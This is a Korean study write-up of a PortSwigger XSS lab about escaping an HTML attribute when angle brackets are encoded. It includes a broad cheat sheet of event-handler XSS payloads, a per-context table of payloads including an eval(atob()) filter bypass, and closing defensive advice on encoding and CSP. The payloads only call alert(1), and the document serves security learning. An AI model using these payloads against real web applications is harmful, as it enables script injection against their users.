# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — Reflected / HTML 속성 컨텍스트 탈출
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

## 목표

검색 기능의 `value` 속성 내부에서 `<script>` 없이 이벤트 핸들러만으로 `alert()` 를 실행시킨다.

## 취약점 분석

검색어가 `<input>` 태그의 `value` 속성 안에 반영된다.

```html
<!-- 정상 검색 시 -->
<input type="text" value="hello">

<!-- <> 가 HTML 엔티티 인코딩됨 -->
검색어: <script>alert(1)</script>
결과:   <input type="text" value="&lt;script&gt;alert(1)&lt;/script&gt;">
        → 브라우저가 태그로 해석하지 않으므로 실행 안 됨
```

`<`와 `>`는 인코딩되지만 `"`는 인코딩되지 않는다.

## 공격 방법 — `"` 로 속성 탈출

`"` 로 현재 속성값을 닫고, 새 이벤트 핸들러를 삽입한다.

```
검색어: " onfocus="alert(1)" autofocus="
```

생성되는 HTML:

```html
<input type="text" value="" onfocus="alert(1)" autofocus="">
```

- `"` — `value` 속성 닫기
- `onfocus="alert(1)"` — 포커스 이벤트 핸들러 삽입
- `autofocus` — 페이지 로드 시 자동으로 포커스 부여 → 사용자 클릭 없이 즉시 실행
- 마지막 `="` — 뒤따르는 원래 `"` 를 흡수해 HTML 문법 유지

## SQL Injection과의 비교 (반복 패턴)

| SQL Injection | HTML 속성 XSS |
|--------------|--------------|
| `'` 로 문자열 닫기 | `"` 로 속성값 닫기 |
| `;` 로 구문 구분 | 공백으로 새 속성 추가 |
| `--` 로 나머지 무력화 | `="` 로 나머지 속성값 흡수 |

**모든 인젝션 공격의 공통 패턴 — 기존 구문을 닫고, 공격 코드를 삽입한다.**

---

## `<script>` 없이 XSS를 일으키는 이벤트 핸들러 전체 정리

### 분류 기준

| 분류 | 조건 |
|------|------|
| **자동 실행** | 사용자 상호작용 없이 페이지 로드만으로 실행 |
| **상호작용 필요** | 마우스·키보드·포커스 등 사용자 동작 필요 |
| **상황 의존** | CSS 애니메이션·전환 등 특정 환경 조건 필요 |

---

### 1. 자동 실행 이벤트 — 가장 강력

사용자가 아무것도 하지 않아도 실행된다.

#### 로드 / 에러

```html
<!-- 이미지 로드 실패 유발 -->
<img src=x onerror=alert(1)>

<!-- SVG 로드 즉시 실행 -->
<svg onload=alert(1)>

<!-- iframe 로드 완료 시 -->
<iframe onload=alert(1)>

<!-- 미디어 로드 실패 -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- body 로드 완료 (innerHTML에서는 제한적) -->
<body onload=alert(1)>

<!-- script 로드 실패 -->
<script src=x onerror=alert(1)></script>
```

#### 포커스 자동 부여 (`autofocus` 조합)

```html
<!-- input에 자동 포커스 → onfocus 즉시 발화 -->
<input autofocus onfocus=alert(1)>

<!-- tabindex로 포커스 가능하게 만들고 자동 부여 -->
<svg autofocus tabindex=1 onfocus=alert(1)>
<div autofocus tabindex=1 onfocus=alert(1)></div>
```

#### details 태그 `open` 속성

```html
<!-- open 속성으로 이미 열린 상태 → 토글 이벤트 즉시 발화 -->
<details open ontoggle=alert(1)>
<summary>내용</summary>
</details>
```

#### marquee 스크롤 이벤트

```html
<marquee onstart=alert(1)>텍스트</marquee>
<marquee loop=1 onfinish=alert(1)>텍스트</marquee>
```

---

### 2. 상황 의존 이벤트 — CSS 애니메이션 / 전환

CSS 애니메이션이나 전환(transition)이 정의된 환경에서만 동작한다.  
기존 페이지에 이미 CSS 애니메이션이 있다면 추가 설정 없이 활용 가능하다.

#### `onanimationstart` / `onanimationend` / `onanimationiteration`

CSS `@keyframes` 애니메이션이 시작·종료·반복될 때 발화한다.

```html
<!-- style 태그가 허용되는 환경 -->
<style>
  @keyframes x { from { opacity:1 } to { opacity:0 } }
</style>
<div style="animation:x 1s" onanimationstart=alert(1)>텍스트</div>

<!-- style 속성만 허용되는 환경 -->
<div style="animation:x 0.1s infinite"
     onanimationiteration=alert(1)>텍스트</div>

<!-- 애니메이션 완료 시 -->
<div style="animation:x 0.1s forwards"
     onanimationend=alert(1)>텍스트</div>
```

**속성 컨텍스트 공격 시 (이번 랩과 같은 상황):**

```html
<!-- 기존 페이지에 @keyframes 가 정의되어 있을 때 -->
<input value="" style="animation:existing-keyframe 1s"
       onanimationstart=alert(1) autofocus="">
```

#### `ontransitionend`

CSS `transition` 이 완료될 때 발화한다.  
속성 값이 변해야 transition이 시작되므로, CSS로 초기/종료 상태를 정의해야 한다.

```html
<!-- 포커스 시 color 변경 → transition 완료 후 발화 -->
<input style="transition:color 0.1s; color:red"
       onfocus="this.style.color='blue'"
       ontransitionend=alert(1)
       autofocus>

<!-- hover 시 transform 변경 → transition 완료 후 발화 (상호작용 필요) -->
<div style="transition:transform 0.1s"
     onmouseover="this.style.transform='scale(1.1)'"
     ontransitionend=alert(1)>텍스트</div>
```

#### `onanimationstart` 의 자동 실행 트릭

`autofocus` + `onfocus` + `style` 조합으로 상호작용 없이 실행 가능하다.

```html
<input autofocus
       style="animation:x 0.1s"
       onanimationstart=alert(1)>
```

페이지에 `@keyframes x` 가 정의되어 있으면 즉시 실행된다.

---

### 3. 마우스 이벤트

사용자가 마우스를 움직여야 하지만, `onmouseover` 는 대상 위에 올리기만 해도 발화한다.

```html
<a href="#" onmouseover=alert(1)>링크 위에 마우스 올리기</a>
<img src="/valid.gif" onmouseover=alert(1)>
<div onmouseover=alert(1) style="width:100%;height:100vh">전체 화면</div>
<svg onmouseover=alert(1)>SVG</svg>
```

| 이벤트 | 발화 시점 |
|--------|-----------|
| `onmouseover` | 요소 위로 마우스 진입 시 |
| `onmouseout` | 요소에서 마우스 이탈 시 |
| `onmousemove` | 요소 위에서 마우스 이동 시 |
| `onmousedown` | 마우스 버튼 누를 때 |
| `onmouseup` | 마우스 버튼 뗄 때 |
| `onclick` | 클릭 완료 시 |
| `ondblclick` | 더블 클릭 시 |
| `oncontextmenu` | 우클릭 메뉴 열 때 |
| `onwheel` | 마우스 휠 스크롤 시 |

---

### 4. 키보드 이벤트

```html
<input onkeydown=alert(1) autofocus>
<input onkeyup=alert(1) autofocus>
<textarea onkeypress=alert(1) autofocus></textarea>
```

| 이벤트 | 발화 시점 |
|--------|-----------|
| `onkeydown` | 키 누르는 순간 |
| `onkeyup` | 키 떼는 순간 |
| `onkeypress` | 키 누르고 있는 동안 (deprecated) |

---

### 5. 포커스 이벤트

```html
<input onfocus=alert(1) autofocus>
<input onblur=alert(1)>        <!-- 다른 곳 클릭 시 -->
<select onfocus=alert(1) autofocus><option>옵션</option></select>
<textarea onfocus=alert(1) autofocus></textarea>
```

| 이벤트 | 발화 시점 |
|--------|-----------|
| `onfocus` | 요소가 포커스를 받을 때 |
| `onblur` | 요소가 포커스를 잃을 때 |
| `onfocusin` | 포커스 진입 (버블링 O) |
| `onfocusout` | 포커스 이탈 (버블링 O) |

---

### 6. 폼 / 입력 이벤트

```html
<input oninput=alert(1) autofocus>
<input onchange=alert(1) autofocus>
<input onpaste=alert(1) autofocus>
<form onsubmit=alert(1)><button>전송</button></form>
<select onchange=alert(1) autofocus>
  <option>A</option><option>B</option>
</select>
```

| 이벤트 | 발화 시점 |
|--------|-----------|
| `oninput` | 값이 변경되는 즉시 |
| `onchange` | 값 확정 시 (Enter / 포커스 이탈) |
| `onpaste` | 붙여넣기 시 |
| `oncut` | 잘라내기 시 |
| `oncopy` | 복사 시 |
| `onselect` | 텍스트 선택 시 |
| `onsubmit` | 폼 전송 시 |
| `onreset` | 폼 초기화 시 |
| `oninvalid` | 유효성 검사 실패 시 |

---

### 7. 드래그 이벤트

```html
<div draggable=true ondragstart=alert(1)>드래그</div>
<div ondrop=alert(1) ondragover="event.preventDefault()">드롭</div>
```

| 이벤트 | 발화 시점 |
|--------|-----------|
| `ondragstart` | 드래그 시작 시 |
| `ondrag` | 드래그 중 |
| `ondragend` | 드래그 완료 시 |
| `ondragenter` | 드래그 대상 위로 진입 시 |
| `ondragleave` | 드래그 대상에서 이탈 시 |
| `ondragover` | 드래그 대상 위에 있을 때 |
| `ondrop` | 드롭 시 |

---

### 8. 스크롤 이벤트

```html
<!-- 스크롤 가능한 요소 -->
<div style="overflow:auto;height:50px" onscroll=alert(1)>
  <div style="height:200px">내용</div>
</div>

<!-- 페이지 스크롤 -->
<body onscroll=alert(1)>
```

---

### 9. 미디어 이벤트

```html
<video src=x onerror=alert(1)>
<video autoplay onplay=alert(1)><source src="/valid.mp4"></video>
<audio src=x onerror=alert(1)>
```

| 이벤트 | 발화 시점 |
|--------|-----------|
| `onloadstart` | 미디어 로드 시작 |
| `onloadeddata` | 현재 프레임 데이터 로드 완료 |
| `onloadedmetadata` | 메타데이터 로드 완료 |
| `oncanplay` | 재생 가능 상태 |
| `onplay` | 재생 시작 |
| `onpause` | 일시정지 |
| `onended` | 재생 완료 |
| `ontimeupdate` | 재생 위치 변경 시 |
| `onvolumechange` | 볼륨 변경 시 |
| `onerror` | 로드 실패 |

---

### 10. 터치 이벤트 (모바일)

```html
<div ontouchstart=alert(1)>터치</div>
<div ontouchmove=alert(1)>스와이프</div>
<div ontouchend=alert(1)>터치 해제</div>
```

---

## 컨텍스트별 최선 페이로드 요약

| 삽입 위치 | 조건 | 최선 페이로드 |
|-----------|------|--------------|
| `<>` 허용 | 태그 삽입 가능 | `<svg onload=alert(1)>` |
| `"` 속성 안, `<>` 인코딩 | 이번 랩 | `" onfocus=alert(1) autofocus x="` |
| `'` 속성 안, `<>` 인코딩 | 단일 인용부호 | `' onfocus=alert(1) autofocus x='` |
| 이벤트 핸들러 값 안 | `alert` 필터링 | `alert\`1\`` (백틱) 또는 `eval(atob('YWxlcnQoMSk='))` |
| CSS 애니메이션 환경 | `@keyframes` 정의됨 | `style="animation:x 0.1s" onanimationstart=alert(1)` |
| CSS transition 환경 | transition 속성 있음 | `ontransitionend=alert(1)` |

---

## 핵심 정리

- `<`와 `>` 가 인코딩되어도 속성값 내의 `"` 가 인코딩되지 않으면 속성 탈출이 가능하다.
- `<script>` 없이도 `onfocus`, `onerror`, `onload`, `onanimationstart` 등 수십 가지 이벤트 핸들러로 JS 실행이 가능하다.
- `autofocus` 조합으로 사용자 상호작용 없이 자동 실행을 유도할 수 있다.
- 애니메이션/전환 이벤트는 CSS 환경 의존적이지만, 기존 페이지 스타일을 활용하면 추가 설정 없이 발화 가능하다.
- **방어**: 속성값에 삽입되는 입력은 `"`, `'`, `` ` `` 까지 인코딩, CSP로 인라인 이벤트 핸들러(`unsafe-inline`) 차단.
